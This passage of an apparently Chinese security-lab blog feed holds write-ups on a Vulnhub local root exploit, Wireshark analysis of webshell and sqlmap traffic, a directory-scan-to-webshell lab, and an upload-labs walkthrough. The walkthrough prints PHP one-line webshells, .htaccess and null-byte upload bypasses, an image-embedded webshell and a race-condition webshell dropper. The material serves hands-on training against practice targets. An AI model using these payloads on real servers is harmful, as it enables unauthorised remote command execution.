/usr/share/exploitdb/exploits/linux/local/15285.c ./</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112204832.png" alt="QQ截图20240112204832"></p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112205050.png" alt="QQ截图20240112205050"></p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112205308.png" alt="QQ截图20240112205308"></p><p>最后我们输入下面几行代码，即可顺利拿到root权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gcc -o exp 15285.c</span><br><span class="line"></span><br><span class="line">//这个命令 gcc -o exp 15285.c 用于编译一个名为 exp 的可执行文件，该文件的源代码是 15285.c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chmod 777 exp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./exp</span><br><span class="line"></span><br><span class="line">//运行 ./exp 命令将尝试执行名为 exp 的可执行文件</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112210117.png" alt="QQ截图20240112210117"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/key.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240112210217.png" alt="QQ截图20240112210217"></p><p>实验成功</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;靶场下载地址&quot;&gt;靶场下载地址&lt;/span&gt;&lt;/h1&gt;&lt;h3&gt;&lt;span id=&quot;一-靶场下载地址&quot;&gt;一、靶场下载地址&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://www.vulnhub.com/entry/hackademic-rtb</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>四十，Wireshark抓包分析</title>
    <link href="http://example.com/2024/01/20/%E5%9B%9B%E5%8D%81%EF%BC%8CWireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2024/01/20/%E5%9B%9B%E5%8D%81%EF%BC%8CWireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/</id>
    <published>2024-01-20T12:21:37.000Z</published>
    <updated>2024-01-20T12:22:04.909Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="一-抓包蚁剑">一、抓包蚁剑</span></h3><p>首先，我们使用蚁剑进行一些操作，并使用wireshark将数据包抓取，生成一个文件，双击点开</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240111191903.png" alt="QQ截图20240111191903"></p><p>我们可以使用下面的命令，筛选出我们需要的http包，并一个一个分析，看看我们都有那些操作</p><p>流程：右键该数据包——&gt;跟踪流——&gt;http</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ip.src == 192.168.2.114 or ip.dst == 192.168.2.114) and http</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240111192613.png" alt="QQ截图20240111192613"></p><p>查看编号12的数据包，这里我们看到的是经过64base编码后的数据，需要解码</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240111192730.png" alt="QQ截图20240111192730"></p><p>可以使用该解码器<code>https://icyberchef.com/</code>，解码后可以看到我们进行的<code>ipconfig</code>的查询</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240111192547.png" alt="QQ截图20240111192547"></p><p>继续看下一个数据包，因为编号12和15是一来一回的数据包，所以我们直接看35数据包</p><p>这是输入了<code>systeminfo</code>查看了版本信息</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240111193617.png" alt="QQ截图20240111193617"></p><p>下一个，这是一个命令执行<code>whoami</code>的操作</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240111193844.png" alt="QQ截图20240111193844"></p><p>下一个，并不是每个数据包都能显示有用的操作，需要耐心和时间，这一个意思是进入到web目录</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240111194220.png" alt="QQ截图20240111194220"></p><p>这一个是我们进入或者创建了一个666.txt文件</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240111194452.png" alt="QQ截图20240111194452"></p><p>接下来这一个数据包是我们在<code>666.txt</code>中写入的东西<code>hello world ni hao 666</code></p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240111194945.png" alt="QQ截图20240111194945"></p><p>这样我们就从这些数据包中得到了有用的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">12    ipconfig</span><br><span class="line">35    systeminfo</span><br><span class="line">49    whoami</span><br><span class="line">57    进入web目录</span><br><span class="line">69    在该目录下创建一个666.txt</span><br><span class="line">100    在666.txt中写了hello world ni hao 666</span><br></pre></td></tr></table></figure><h3><span id="二-抓包sqlmap">二、抓包sqlmap</span></h3><p>我们拿sql-lib第一关试试水，一样的使用wireshark抓包，分析数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.86.140/sqli/Less-1/?id=1&quot; --batch --current-db</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240111200924.png" alt="QQ截图20240111200924"></p><p>筛选出我们需要的http包，点击查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ip.src == 192.168.86.140 or ip.dst == 192.168.86.140) and http</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240111202231.png" alt="QQ截图20240111202231"></p><p>这是我们的一个sql语法，使用二分法判断该数据库的第一位是不是大于aciss码里的64</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240111202418.png" alt="QQ截图20240111202418"></p><p>这里一共有七个这样的包，我们直接看到最后一个包，这个是判断是不是大于115，显然我们的数据包到这里就停了，所以可以判断数据库第一位对应这aciss码的115，也就是s</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240111203203.png" alt="QQ截图20240111203203"></p><p>接下来的也是这样，我们只需要看每一组（他这里分了C1、C2等）的最后一条数据，即可判断</p><p>最后得到的数据库是security</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;一-抓包蚁剑&quot;&gt;一、抓包蚁剑&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;首先，我们使用蚁剑进行一些操作，并使用wireshark将数据包抓取，生成一个文件，双击点开&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>三十九，目录扫描靶机</title>
    <link href="http://example.com/2024/01/20/%E4%B8%89%E5%8D%81%E4%B9%9D%EF%BC%8C%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E9%9D%B6%E6%9C%BA/"/>
    <id>http://example.com/2024/01/20/%E4%B8%89%E5%8D%81%E4%B9%9D%EF%BC%8C%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E9%9D%B6%E6%9C%BA/</id>
    <published>2024-01-20T12:12:53.000Z</published>
    <updated>2024-01-20T12:20:17.015Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="1-端口扫描">1、端口扫描</span></h3><p>我们的<code>靶机ip</code>是<code>192.168.2.197</code></p><p>先使用nmap进行端口扫描</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/image-20240110204844488.png" alt="image-20240110204844488"></p><h3><span id="2-查看端口的内容">2、查看端口的内容</span></h3><p>比如<code>192.168.2.197:27689</code>他打开的页面是一个文件下载页面，需要账号密码登陆</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110194904.png" alt="QQ截图20240110194904"></p><h3><span id="3-目录扫描">3、目录扫描</span></h3><p>我们对这个端口进行目录扫描,扫出来的文件我们都翻一翻</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.2.197:27689</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110195237.png" alt="QQ截图20240110195237"></p><p>查看一下<code>/web.config.bak</code>,可以下载一个文件，查看文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.2.197:27689/web.config.bak</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110195827.png" alt="QQ截图20240110195827"></p><p>我们可以看到这很像一个数据库，我们尝试连接一下,新建一个lyg数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=down</span><br><span class="line">pwd=downsql</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110200623.png" alt="QQ截图20240110200623"></p><p>随便查看一下数据库的内容，找到一个账号密码admin   123456</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110200820.png" alt="QQ截图20240110200820"></p><p>登陆之前的页面</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110201035.png" alt="QQ截图20240110201035"></p><p>成功找到第一个key，这里都是一些文件上传的页面，所以我们猜测第二个key，可以利用文件上传漏洞，</p><p>先随便上传一个文件看看，试了一下可以上传jpg文件</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110201826.png" alt="QQ截图20240110201826"></p><p>查看上传的文件，发现有一个上传的规定，我们利用它去上传aspx类型的木马</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110201949.png" alt="QQ截图20240110201949"></p><p>复制图片链接打开看一下，在file后面的位置删掉一截，让他报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.197:27689/admin/file_down.aspx?file=638287889289156441-12311112.aspx</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110203013.png" alt="QQ截图20240110203013"></p><p>根据报错的内容，修改路径</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110203613.png" alt="QQ截图20240110203613"></p><p>木马已经成功植入进去了，我们可以使用蚁剑操作他的后台了，连接密码是我们写木马设置的密码abcd</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110204151.png" alt="QQ截图20240110204151"></p><p>查找一下有没有key，ok成功在web目录下找到了第二个key</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110204559.png" alt="QQ截图20240110204559"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;1-端口扫描&quot;&gt;1、端口扫描&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;我们的&lt;code&gt;靶机ip&lt;/code&gt;是&lt;code&gt;192.168.2.197&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;先使用nmap进行端口扫描&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>三十八，文件上传漏洞</title>
    <link href="http://example.com/2024/01/20/%E4%B8%89%E5%8D%81%E5%85%AB%EF%BC%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/01/20/%E4%B8%89%E5%8D%81%E5%85%AB%EF%BC%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-01-20T11:52:34.000Z</published>
    <updated>2024-01-20T11:55:54.684Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="一-文件上传漏洞类型汇总">一、文件上传漏洞类型汇总</span></h2><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240115190525.png" alt="QQ截图20240115190525"></p><h3><span id="类型">类型：</span></h3><h4><span id="1无限制">1.无限制：</span></h4><p>（1）直接用1.php放一句话木马上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">@eval($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4><span id="2绕过前端">2.绕过前端：</span></h4><h5><span id="1javascript绕过">（1）Javascript绕过：</span></h5><ul><li>浏览器设置中选择禁用javascript即可</li></ul><h5><span id="2抓包修改">（2）抓包修改：</span></h5><ul><li>burpsuite抓包后修改filename</li></ul><h4><span id="3绕过服务端">3.绕过服务端：</span></h4><h5><span id="1黑名单绕过">（1）黑名单绕过：</span></h5><ul><li>例如：不允许php，jsp文件上传，则使用1.php3，1.php5等上传</li></ul><h5><span id="2白名单绕过">（2）白名单绕过：</span></h5><ul><li>例如：允许图片只允许jpg，则抓包改后缀改php为jpg</li></ul><h5><span id="3mime绕过">（3）MIME绕过：</span></h5><ul><li>MIME通过通过检查http包的Content-Type字段来判断上传文件是否合法，所以把类型改成允许上传的格式即可</li></ul><h4><span id="4其他主要是懒得归类了">4.其他（主要是懒得归类了）</span></h4><h5><span id="1-大小写绕过">1-大小写绕过</span></h5><ul><li>如果禁止php文件上传，把文件名改成pHp,PhP等绕过</li></ul><h5><span id="2-00截断绕过">2-00截断绕过</span></h5><ul><li>利用解析漏洞，利用00字符截止判断，例如1.php%00.jpg,或者1.php0x00.jpg</li></ul><h5><span id="3-htaccess绕过">3-.htaccess绕过</span></h5><ul><li>.htaccess是apache配置文件，提供自定法则让服务器运行，例如如下1.htaccess文件，上传后再上传1.png即可获得webshell</li></ul><h5><span id="4-双写绕过">4-双写绕过</span></h5><ul><li>如果禁止php文件上传，把文件名改成1.phphpp即可，其中中间的php过滤掉后仍可成功上传</li></ul><h5><span id="5-点绕过">5-点绕过</span></h5><ul><li>如果服务器开启了黑名单过滤，则可采用1.php.的方式（仔细看有两个点）绕过并解析</li></ul><h5><span id="6-空格绕过">6-空格绕过</span></h5><h5><span id="7-data绕过">7-  ::$DATA绕过</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在1.php后加上::$DATA</span><br><span class="line"> 1.php--&gt;1.php::$DATA</span><br></pre></td></tr></table></figure><h2><span id="二-闯关">二、闯关</span></h2><h3><span id="1-第一关">1、第一关</span></h3><p>这一关仅在前端校验，且仅允许.jpg|.png|.gif文件类型上传，我们可以采用<strong>禁用js</strong>的方法</p><p>web.php的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">@system($_GET[a]);  </span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//具体来说，代码使用了$_GET[a]来获取用户通过GET请求传递的参数值，并将该参数作为命令传递给system()函数进行执行。这样，通过在URL中传递不同的命令作为参数值，就可以在服务器上执行相应的操作系统命令。</span><br></pre></td></tr></table></figure><p>禁用js，直接上传</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954877.png" alt="QQ截图20240109171249"></p><p>输入后缀命令</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109171344.png" alt="QQ截图20240109171344"></p><h3><span id="2-第二关">2、第二关</span></h3><p>我们查看源代码可以看出，本关只检查上传的<code>文件类型</code></p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109110625.png" alt="QQ截图20240109110625"></p><p>我们可以使用抓包工具，抓取一下上传的数据包，先上传一个<code>web shell.php</code></p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109111203.png" alt="QQ截图20240109111203"></p><p>文件类型不正确，在<code>yakit手动劫持</code>，观察劫持的数据包</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109111220.png" alt="QQ截图20240109111220"></p><p>我们可以看到文件类型和上传的内容</p><p>所以我们可以<code>修改</code>一下文件类型，将它修改成<code>允许通过</code>的类型</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109111854.png" alt="QQ截图20240109111854"></p><p>提交数据，直接自动放行，可以看到web shell.php文件以image&#x2F;jpeg的形式上传了</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109112123.png" alt="QQ截图20240109112123"></p><p>复制图片文件链接，在浏览器打开一下输入后缀?a&#x3D;systeminfo      意思是显示系统信息</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109112328.png" alt="QQ截图20240109112328"></p><h3><span id="3-第三关">3、第三关</span></h3><p>特殊环境，老版小皮</p><p>这一关的话需要在配置文件httpd.conf做修改</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954831.png" alt="QQ截图20240109141434"></p><p>这句话的意思是.php  .phtml   .php5 都可以解析成php文件</p><p>所以我们把web shell.php修改成web shell.php5</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109141509.png" alt="QQ截图20240109141509"></p><p>上传成功后即可复制图片链接验证</p><h3><span id="4-第四关">4、第四关</span></h3><p>特殊环境，老版小皮</p><p>这里我们需要使用到.htaccess文件，</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954742.png" alt="QQ截图20240109143552"></p><p>​    .htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。 启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。 它里面有这样一段代码：AllowOverride None，如果我们把None改成All image-20211026115955250</p><p>这一关的思路是我们建立一个.htaccess文件，在文件中写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;2.jpg&quot;&gt;</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>将.htaccess文件上传</p><p>把我们写了木马的文件名改为2.jpg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">@system($_GET[a]);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>点击上传</p><h3><span id="5-第五关">5、第五关</span></h3><p>特殊环境</p><p>创建一个.user.ini文件并把它上传，内容为auto_prepend_file&#x3D;2.jpg</p><p>上传并访问2.jpg(一句话木马)</p><p>等待300秒访问readme.php</p><h3><span id="6-第六关">6、第六关</span></h3><p>查看源代码，我们可以看到它拒绝以下的文件类型</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109151633.png" alt="QQ截图20240109151633"></p><p>我们可以使用<code>大小写绕过</code>，web.PHP</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954328.png" alt="QQ截图20240109155343"></p><h3><span id="7-第七关">7、第七关</span></h3><p><strong>空格绕过</strong></p><p>在kkk.php后面加个空格就行</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954084.png" alt="QQ截图20240115192302"></p><h3><span id="8-第八关">8、第八关</span></h3><p>加个点</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954519.png" alt="QQ截图20240115192714"></p><h3><span id="9-第九关">9、第九关</span></h3><p>在kkk.php后面加<code>::$DATA</code></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954097.png" alt="QQ截图20240115193851"></p><p>在蚁剑中测试连接时，需要将<code>::$DATA</code>删掉</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240115193711.png" alt="QQ截图20240115193711"></p><h3><span id="10-第十关">10、第十关</span></h3><p>这一关黑名单，最后上传路径直接使用文件名进行拼接，而且只对文件名进行<br><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954519.png" alt="QQ截图20240115192714"></p><h3><span id="11-第十一关">11、第十一关</span></h3><p>这一关黑名单，使用str_ireplace()函数寻找文件名中存在的黑名单字符串，将它替换成空（即将它删掉），可以使用双写绕过黑名单</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954932.png" alt="QQ截图20240115192302"></p><h3><span id="12-第十二关">12、第十二关</span></h3><p>这一关白名单，最终文件的存放位置是以拼接的方式，可以使用%00截断，但需要<code>php版本&lt;5.3.4</code>，并且<code>magic_quotes_gpc</code>关闭。</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954092.png" alt="QQ截图20240115195201"></p><h3><span id="13-第十三关">13、第十三关</span></h3><p>这一关白名单，文件上传路径拼接生成，而且使用了post发送的数据进行拼接，我们可以控制post数据进行0x00截断绕过白名单</p><p>在upload的位置加上<code>kkk.php空格</code></p><p>把filename的kkk.php改为<code>kkk.png</code></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201954059.png" alt="QQ截图20240115195352"></p><p>把<code>20改为00</code></p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240115195427.png" alt="QQ截图20240115195427"></p><p>在蚁剑测试链接时，把选中的删掉</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240115200208.png" alt="QQ截图20240115200208"></p><h3><span id="14-第十四关">14、第十四关</span></h3><p>这一关会读取判断上传文件的前两个字节，判断上传文件类型，并且后端会根据判断得到的文件类型重命名上传文件使用 <code>图片马 + 文件包含</code> 绕过</p><p>意思就是说<code>把木马放在图片里面上传</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy .\微信图片_20240115165541.jpg/b+.\kkk.php kkk666.jpg</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240115200519.png" alt="QQ截图20240115200519"></p><p>点击上传</p><p>因为上传图片马之后会被重命名图片所以下面的payload的图片名字可以在上传之后复制图片链接就可以了</p><p>构造的URL为<code>include.php?file=./upload/3820240115200610.jpg</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.154/upload-labs-master/upload-labs-master/include.php?file=./upload/3820240115200610.jpg</span><br></pre></td></tr></table></figure><h3><span id="15-第十五关">15、第十五关</span></h3><p>和第十四关一样</p><h3><span id="18-第十八关">18、第十八关</span></h3><p>从源码来看，服务器先是将上传的文件保存下来，然后将文件的后缀名同白名单对比，如果是jpg、png、gif中的一种，就将文件进行重命名。如果不符合的话，<code>unlink()</code>函数就会删除该文件。删除需要时间，只要<code>上传大于删除的速度</code>就可以访问，用造木马的马。</p><p>1.发送一个造马的马，yakit抓包，发到测试器中</p><p>2.访问这个造马的马，yakit抓包，发到测试器中</p><p>3.当2回显200时关闭攻击，上一个目录下有666.php文件</p><p>4.连接即可</p><p>建一个666.php文件，666.php的木马程序：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;../666.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @system($_GET[a]); ?&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="number">1</span>、<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;../666.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>): 打开一个名为<span class="number">666</span>.php的文件以进行写操作。../表示在上一级目录中创建该文件。如果相对路径解析正确，并且脚本有足够的权限，它将尝试在服务器上创建或覆盖一个名为<span class="number">666</span>.php的文件。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、<span class="title function_ invoke__">fputs</span>(...): 将文本写入文件。在这里，它将下一个参数中的内容写入<span class="number">666</span>.php文件。</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、<span class="string">&#x27;&lt;?php @system($_GET[a]); ?&gt;&#x27;</span>: 这是写入文件的内容。它是一个PHP脚本，它使用@system函数执行通过GET参数传递的系统命令。具体来说，它使用<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]中传递的参数执行系统命令。</span><br></pre></td></tr></table></figure><p>将该文件上传，使用yakit抓包，将重复发包和并发进程修改为下图</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109192444.png" alt="QQ截图20240109192444"></p><p>然后我们访问一下造马的马，yakit抓包，发到测试器中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.140/upload-labs-master/upload-labs-master/upload/666.php</span><br></pre></td></tr></table></figure><p>设置如图</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109192801.png" alt="QQ截图20240109192801"></p><p>将两个测试包都点击发送</p><p>第二个测试包有200出现时，即我们的实验成功了，成功上传了木马文件</p><p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109193207.png" alt="QQ截图20240109193207"></p><p>在我们的目录下也出现了666.php文件</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201955836.png" alt="QQ截图20240109193257"></p><h3><span id="文件上传题目">文件上传题目</span></h3><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201955121.png" alt="QQ截图20240110163715"></p><p><code>$fullpath=&#39;/&#39;.md5($filename.$randnum).&quot;.&quot;.substr($filename,strripos($filename,&#39;.&#39;)+1);</code>: 这一行构造了上传文件的完整路径。让我解释这个过程：</p><ul><li><p><code>md5($filename.$randnum)</code>: 